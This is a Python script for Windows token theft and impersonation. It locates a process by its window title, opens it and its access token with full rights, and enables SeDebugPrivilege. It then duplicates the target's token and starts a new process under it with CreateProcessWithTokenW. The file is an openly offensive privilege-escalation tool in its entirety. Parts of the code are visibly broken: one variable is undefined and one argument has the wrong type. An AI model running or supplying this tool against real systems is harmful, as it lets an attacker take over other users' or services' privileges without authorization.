import ctypes
import argparse

from modules.structs import LUID, LUID_AND_ATTRIBUTES, TOKEN_PRIVILEGES, PRIVILEGE_SET, TokenRights, SECURITY_ATTRIBUTES, STARTUPINFO, PROCESS_INFORMATION

u_handle = ctypes.WinDLL("User32.dll")
k_handle = ctypes.WinDLL("Kernel32.dll")
a_handle = ctypes.WinDLL("Advapi32.dll")


PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
SE_PRIVILEGE_ENABLED = 0x00000002
SE_PRIVILEGE_DISABLED = 0x00000000

    

def enablePrivs(priv, handle):
    requiredPrivs = PRIVILEGE_SET()
    requiredPrivs.PrivilegeCount = 1
    requiredPrivs.Privileges = LUID_AND_ATTRIBUTES()
    requiredPrivs.Privileges.Luid = LUID()

    lpSystemName = None
    LpName = priv

    v1 = a_handle.LookupPrivilegeValueW(lpSystemName, LpName, ctypes.byref(requiredPrivs.Privileges.Luid))

    if v1 > 0 :
        print("[*] Look up priv {0} successful".format(priv))

    else:
        print("[!] Lookup for privilege {0} failed with error code {1}".format(priv, k_handle.GetLastError()))

    pfResult = ctypes.c_long()
    v2 = a_handle.PrivilegeCheck(handle, ctypes.byref(requiredPrivs), ctypes.byref(pfResult))

    if v2 > 0:
        print("[*] Privilege check successful...")
    else:
        print("[!] Privilege check failed with error code {0}". format(k_handle.GetLastError()))

    if pfResult:
        print("[*] Privilege enabled: {0}".format(priv))
    else:
        print("[!] Privilege not enabled in process")
        requiredPrivs.Privileges.Attributes = SE_PRIVILEGE_ENABLED

    DisableAllPrivileges = False
    NewState = TOKEN_PRIVILEGES()
    BufferLength = ctypes.sizeof(NewState)
    PreviousState = ctypes.c_void_p()
    ReturnLength = ctypes.c_void_p()

    NewState.PrivilegeCount = 1
    NewState.Privileges = requiredPrivs.Privileges

    v3 = a_handle.AdjustTokenPrivileges(
        handle,
        DisableAllPrivileges,
        ctypes.byref(NewState),
        BufferLength,
        ctypes.byref(PreviousState),
        ctypes.byref(ReturnLength)
    )

    if v3 > 0:
        print("[*] Token Privileges Changed Successfully... ")
    else:
        print("[!] Token Privileges Change failed with error code {0}".format(k_handle.GetLastError()))

    return 0 

def handleProc(pid):
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    dwProccessId = pid

    hProcess = k_handle.OpenProcess(dwDesiredAccess, bInheritHandle, dwProccessId)

    if hProcess <= 0:
        print("[!] Gain privileged handle failed with error code {0}".format(k_handle.GetLastError()))
        return 1
    else:
        print("[*] Privileged handle opened successfully...")
        return hProcess

def handleToken(hProcess):
    ProcessHandle = hProcess
    DesiredAccess = TokenRights.TOKEN_ALL_ACCESS
    TokenHandle = ctypes.c_void_p()

    v4 = k_handle.OpenProcessToken(ProcessHandle, DesiredAccess, ctypes.byref(TokenHandle))

    if v4 > 0:
        print("[*] Open Token Handle Successful...")
        return TokenHandle
    else:
        print("[!] Open privileged token handle failed eith error code {0}".format(k_handle.GetLastError()))
        return 1
    

def execute(window_name=None):
    lpwindowName = ctypes.c_char_p(window_name.encode('utf-8'))
    hWnd = u_handle.FindWindowA(None, lpwindowName)

    if hWnd == 0:
            print("Failed to find window '{0}'. Error code: {1}".format(window_name, k_handle.GetLastError()))
            return False
    else:
        print('Found window: {0}'.format(window_name))

    lpdwProcessId = ctypes.c_ulong()
    u_handle.GetWindowThreadProcessId(hWnd, ctypes.byref(lpdwProcessId))
    pid = lpdwProcessId.value
    
    if pid == 0:
        print("Failed to retrieve process ID for window '{0}'".format(window_name))
        return False
    else:
        print('Window ProcessId: {0}'.format(pid))

    TokenHandle = handleToken(handleProc(lpdwProcessId))
    cProcHandle = handleToken(handleProc(k_handle.GetCurrentProcessId()))

    print("[*] Attempting to enable SEDebugPrivilege on current process...")
    v5 = enablePrivs("SEDebugPrivilege", cProcHandle)

    if v5 !=0:
        print("[!] Enable Privilege failed...")
        exit(1)

    hExistingToken = ctypes.c_void_p()
    dwDesiredAccess = TokenRights.TOKEN_ALL_ACCESS
    lpTokenAttributes = SECURITY_ATTRIBUTES()
    ImpersonationLevel = 2
    TokenType = 1

    lpTokenAttributes.bInheritHandle = False
    lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()
    lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)

    v6 = a_handle.DuplicateTokenEx(
        TokenHandle,
        dwDesiredAccess,
        ctypes.byref(lpTokenAttributes),
        ImpersonationLevel,
        TokenType,
        ctypes.byref(hExistingToken)
    )

    if v6 == 0:
        print("[!] Token Duplication failed with error code {0}".format(k_handle.GetLastError()))

    hToken = hExistingToken
    dwLogonFlags = 0x00000001 
    lpCommandLine = None
    dwCreationFlags = 0x00000010 
    lpEnvironment = ctypes.c_void_p()
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpProcessInformation = PROCESS_INFORMATION()

    
    lpStartupInfo.wShowWindow = 0x1
    lpStartupInfo.dwFlags = 0x1
    lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)

    v7 = a_handle.CreateProcessWithTokenW(
    	hToken,
    	dwLogonFlags,
    	lpApplicationName,
    	lpCommandLine,
    	dwCreationFlags,
    	lpEnvironment,
    	lpCurrentDirectory,
    	ctypes.byref(lpStartupInfo),
    	ctypes.byref(lpProcessInformation))

    if v7 == 0 :
        print("[!] Create process with duplicated token failed with error code {0}".format(k_handle.GetLastError()))
    else:
        print("[*] Create Impersonated process successful...")




parser = argparse.ArgumentParser()
parser.add_argument('-w', '--window', type=str, help='Name of window to hook')
args = parser.parse_args()

if args.window:
    execute(window_name=args.window)
else:
    print("[!] --window is required")
    parser.print_help()
